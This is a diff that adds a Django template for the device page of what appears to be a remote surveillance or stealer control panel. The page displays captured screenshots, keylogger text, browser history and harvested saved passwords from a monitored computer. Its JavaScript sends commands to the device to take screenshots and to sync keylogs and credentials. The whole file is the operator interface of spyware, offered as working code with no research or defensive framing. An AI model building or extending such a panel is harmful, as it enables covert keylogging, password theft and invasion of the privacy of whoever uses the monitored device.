@@ -1,0 +1,352 @@
+{% extends 'base.html' %}
+
+{% block title %}{{ device.hostname }} - Controller{% endblock %}
+{% block page_title %}{{ device.hostname }}{% endblock %}
+
+{% block content %}
+<!-- Device Header -->
+<div class="card fade-in" style="margin-bottom: 24px;">
+    <div class="card-body">
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px;">
+            <div style="display: flex; align-items: center; gap: 16px;">
+                <div style="width: 64px; height: 64px; background: var(--accent-gradient); border-radius: var(--radius-lg); display: flex; align-items: center; justify-content: center;">
+                    <i class="ph-bold ph-desktop" style="font-size: 32px; color: white;"></i>
+                </div>
+                <div>
+                    <h2 style="font-size: 24px; font-weight: 600; margin-bottom: 4px;">{{ device.hostname }}</h2>
+                    <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
+                        <code style="font-size: 12px; color: var(--text-muted); background: var(--bg-tertiary); padding: 4px 8px; border-radius: var(--radius-sm);">{{ device.device_id }}</code>
+                        {% if device.is_online %}
+                        <span class="badge badge-success">
+                            <span class="badge-dot pulse"></span>
+                            Online
+                        </span>
+                        {% else %}
+                        <span class="badge badge-warning">
+                            <span class="badge-dot"></span>
+                            Offline
+                        </span>
+                        {% endif %}
+                        {% if device.config.kill_switch %}
+                        <span class="badge badge-danger">
+                            <i class="ph ph-warning"></i>
+                            Kill Switch Active
+                        </span>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+            <div style="display: flex; gap: 12px;">
+                <button class="btn btn-primary" onclick="takeScreenshot()">
+                    <i class="ph ph-camera"></i>
+                    Take Screenshot
+                </button>
+                <button class="btn btn-secondary" onclick="syncConfig()">
+                    <i class="ph ph-arrows-clockwise"></i>
+                    Sync Config
+                </button>
+                <a href="{% url 'device_settings' device.device_id %}" class="btn btn-secondary">
+                    <i class="ph ph-gear"></i>
+                    Settings
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Stats Row -->
+<div class="stats-grid" style="grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));">
+    <div class="card stat-card fade-in">
+        <div class="stat-icon purple"><i class="ph-bold ph-camera"></i></div>
+        <div class="stat-value">{{ screenshots.count|default:0 }}</div>
+        <div class="stat-label">Screenshots</div>
+    </div>
+    <div class="card stat-card fade-in">
+        <div class="stat-icon green"><i class="ph-bold ph-keyboard"></i></div>
+        <div class="stat-value">{{ keylogs.count|default:0 }}</div>
+        <div class="stat-label">Keylog Entries</div>
+    </div>
+    <div class="card stat-card fade-in">
+        <div class="stat-icon blue"><i class="ph-bold ph-clock-counter-clockwise"></i></div>
+        <div class="stat-value">{{ history_count|default:0 }}</div>
+        <div class="stat-label">History Entries</div>
+    </div>
+    <div class="card stat-card fade-in">
+        <div class="stat-icon blue" style="background: rgba(139, 92, 246, 0.15); color: var(--accent-primary);"><i class="ph-bold ph-lock-key"></i></div>
+        <div class="stat-value">{{ credential_count|default:0 }}</div>
+        <div class="stat-label">Passwords</div>
+    </div>
+    <div class="card stat-card fade-in">
+        <div class="stat-icon orange"><i class="ph-bold ph-terminal"></i></div>
+        <div class="stat-value">{{ commands.count|default:0 }}</div>
+        <div class="stat-label">Commands</div>
+    </div>
+</div>
+
+<!-- Tabs -->
+<div class="card fade-in">
+    <div style="border-bottom: 1px solid var(--border-color);">
+        <div style="display: flex; gap: 0; padding: 0 24px;">
+            <button class="tab-btn active" data-tab="screenshots" style="padding: 16px 24px; background: none; border: none; color: var(--text-primary); font-size: 14px; font-weight: 500; cursor: pointer; border-bottom: 2px solid var(--accent-primary); margin-bottom: -1px;">
+                <i class="ph ph-camera" style="margin-right: 8px;"></i>
+                Screenshots
+            </button>
+            <button class="tab-btn" data-tab="keylogs" style="padding: 16px 24px; background: none; border: none; color: var(--text-secondary); font-size: 14px; font-weight: 500; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px;">
+                <i class="ph ph-keyboard" style="margin-right: 8px;"></i>
+                Keylogs
+            </button>
+            <button class="tab-btn" data-tab="commands" style="padding: 16px 24px; background: none; border: none; color: var(--text-secondary); font-size: 14px; font-weight: 500; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px;">
+                <i class="ph ph-terminal" style="margin-right: 8px;"></i>
+                Commands
+            </button>
+            <button class="tab-btn" data-tab="browser" style="padding: 16px 24px; background: none; border: none; color: var(--text-secondary); font-size: 14px; font-weight: 500; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px;">
+                <i class="ph ph-globe" style="margin-right: 8px;"></i>
+                Browser Data
+            </button>
+        </div>
+    </div>
+    
+    <!-- Screenshots Tab -->
+    <div class="tab-content active" id="tab-screenshots">
+        <div class="card-body">
+            <div class="screenshot-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px;">
+                {% for screenshot in screenshots %}
+                <div style="cursor: pointer; transition: transform 0.2s;" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'" onclick="viewScreenshot('{{ screenshot.secure_url }}')">
+                    <div style="aspect-ratio: 16/10; background: var(--bg-tertiary); border-radius: var(--radius-md); overflow: hidden; position: relative;">
+                        <img src="{{ screenshot.secure_url }}" alt="Screenshot" style="width: 100%; height: 100%; object-fit: cover;" loading="lazy">
+                        <div style="position: absolute; top: 8px; right: 8px;">
+                            <span class="badge badge-info" style="font-size: 10px; padding: 4px 8px;">{{ screenshot.trigger_type }}</span>
+                        </div>
+                    </div>
+                    <div style="padding: 12px 4px;">
+                        <div style="font-size: 13px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ screenshot.active_window_title|default:"Unknown Window" }}</div>
+                        <div style="font-size: 12px; color: var(--text-muted);">{{ screenshot.captured_at|date:"M d, Y H:i" }}</div>
+                    </div>
+                </div>
+                {% empty %}
+                <div style="grid-column: 1 / -1;">
+                    <div class="empty-state">
+                        <i class="ph ph-camera"></i>
+                        <h3>No screenshots yet</h3>
+                        <p>Click "Take Screenshot" to capture the device screen.</p>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+    
+    <!-- Keylogs Tab -->
+    <div class="tab-content" id="tab-keylogs" style="display: none;">
+        <div class="card-body">
+            {% for keylog in keylogs %}
+            <div style="background: var(--bg-tertiary); border-radius: var(--radius-md); padding: 16px; margin-bottom: 16px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                    <div style="font-size: 12px; color: var(--text-muted);">
+                        {{ keylog.start_time|date:"M d, Y H:i" }} - {{ keylog.end_time|date:"H:i" }}
+                    </div>
+                    <div style="display: flex; gap: 8px;">
+                        <span class="badge badge-info" style="font-size: 11px;">{{ keylog.character_count }} chars</span>
+                        <span class="badge badge-success" style="font-size: 11px;">{{ keylog.window_switches }} windows</span>
+                    </div>
+                </div>
+                <pre style="font-family: 'Consolas', monospace; font-size: 13px; line-height: 1.6; color: var(--text-secondary); white-space: pre-wrap; word-wrap: break-word; max-height: 200px; overflow-y: auto; background: var(--bg-primary); padding: 12px; border-radius: var(--radius-sm);">{{ keylog.data }}</pre>
+            </div>
+            {% empty %}
+            <div class="empty-state">
+                <i class="ph ph-keyboard"></i>
+                <h3>No keylog data</h3>
+                <p>Keylog entries will appear here once the device starts logging.</p>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+    
+    <!-- Commands Tab -->
+    <div class="tab-content" id="tab-commands" style="display: none;">
+        <div class="card-body">
+            <div style="margin-bottom: 24px;">
+                <h4 style="font-size: 14px; font-weight: 600; margin-bottom: 12px;">Send Command</h4>
+                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                    <button class="btn btn-secondary" onclick="sendCommand('screenshot')">
+                        <i class="ph ph-camera"></i>
+                        Screenshot
+                    </button>
+                    <button class="btn btn-secondary" onclick="sendCommand('keylog_sync')">
+                        <i class="ph ph-upload"></i>
+                        Sync Keylogs
+                    </button>
+                    <button class="btn btn-secondary" onclick="sendCommand('config_refresh')">
+                        <i class="ph ph-arrows-clockwise"></i>
+                        Refresh Config
+                    </button>
+                </div>
+            </div>
+            
+            <h4 style="font-size: 14px; font-weight: 600; margin-bottom: 12px;">Command History</h4>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>Status</th>
+                            <th>Created</th>
+                            <th>Executed</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for command in commands %}
+                        <tr>
+                            <td>
+                                <code style="background: var(--bg-tertiary); padding: 4px 8px; border-radius: var(--radius-sm);">{{ command.command_type }}</code>
+                            </td>
+                            <td>
+                                {% if command.status == 'pending' %}
+                                <span class="badge badge-warning">Pending</span>
+                                {% elif command.status == 'executed' %}
+                                <span class="badge badge-success">Executed</span>
+                                {% elif command.status == 'failed' %}
+                                <span class="badge badge-danger">Failed</span>
+                                {% endif %}
+                            </td>
+                            <td style="color: var(--text-secondary);">{{ command.created_at|timesince }} ago</td>
+                            <td style="color: var(--text-secondary);">{{ command.executed_at|default:"-" }}</td>
+                        </tr>
+                        {% empty %}
+                        <tr>
+                            <td colspan="4">
+                                <div class="empty-state" style="padding: 40px;">
+                                    <i class="ph ph-terminal"></i>
+                                    <h3>No commands sent</h3>
+                                    <p>Send a command using the buttons above.</p>
+                                </div>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    <!-- Browser Data Tab -->
+    <div class="tab-content" id="tab-browser" style="display: none;">
+        <div class="card-body">
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px;">
+                <!-- History Summary -->
+                <div class="card">
+                    <div class="card-header">
+                        <h4 class="card-title">Recent History</h4>
+                        <a href="{% url 'browser_history' %}?device={{ device.id }}" class="btn btn-secondary btn-sm">Full View</a>
+                    </div>
+                    <div class="card-body" style="padding: 0;">
+                        <div class="table-container">
+                            <table style="font-size: 12px;">
+                                <tbody>
+                                    <tr><td colspan="2" style="text-align: center; color: var(--text-muted); padding: 20px;">Use the full view to see browsing history.</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Credentials Summary -->
+                <div class="card">
+                    <div class="card-header">
+                        <h4 class="card-title">Recent Credentials</h4>
+                        <a href="{% url 'browser_credentials' %}?device={{ device.id }}" class="btn btn-secondary btn-sm">Full View</a>
+                    </div>
+                    <div class="card-body" style="padding: 0;">
+                        <div class="table-container">
+                            <table style="font-size: 12px;">
+                                <tbody>
+                                    <tr><td colspan="2" style="text-align: center; color: var(--text-muted); padding: 20px;">Use the full view to see saved passwords.</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 24px;">
+                <h4 style="font-size: 14px; font-weight: 600; margin-bottom: 12px;">Data Collection Actions</h4>
+                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                    <button class="btn btn-secondary" onclick="sendCommand('browser_sync')">
+                        <i class="ph ph-arrows-clockwise"></i>
+                        Sync History & Credentials
+                    </button>
+                    <button class="btn btn-secondary" onclick="sendCommand('browser_history_sync')">
+                        <i class="ph ph-clock-counter-clockwise"></i>
+                        Sync History
+                    </button>
+                    <button class="btn btn-secondary" onclick="sendCommand('browser_credential_sync')">
+                        <i class="ph ph-lock-key"></i>
+                        Sync Credentials
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+const deviceId = '{{ device.device_id }}';
+
+// Tab switching
+document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.tab-btn').forEach(b => {
+            b.classList.remove('active');
+            b.style.color = 'var(--text-secondary)';
+            b.style.borderBottomColor = 'transparent';
+        });
+        btn.classList.add('active');
+        btn.style.color = 'var(--text-primary)';
+        btn.style.borderBottomColor = 'var(--accent-primary)';
+        
+        document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+        document.getElementById('tab-' + btn.dataset.tab).style.display = 'block';
+    });
+});
+
+function viewScreenshot(url) {
+    window.open(url, '_blank');
+}
+
+function takeScreenshot() {
+    sendCommand('screenshot');
+}
+
+function syncConfig() {
+    sendCommand('config_refresh');
+}
+
+function sendCommand(commandType) {
+    fetch('/api/commands/send/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': '{{ csrf_token }}'
+        },
+        body: JSON.stringify({
+            device_id: deviceId,
+            command_type: commandType,
+            payload: {}
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) {
+            alert('Error: ' + data.error);
+        } else {
+            alert('Command "' + commandType + '" sent successfully!');
+            location.reload();
+        }
+    })
+    .catch(err => {
+        alert('Failed to send command');
+    });
+}
+</script>
+{% endblock %}
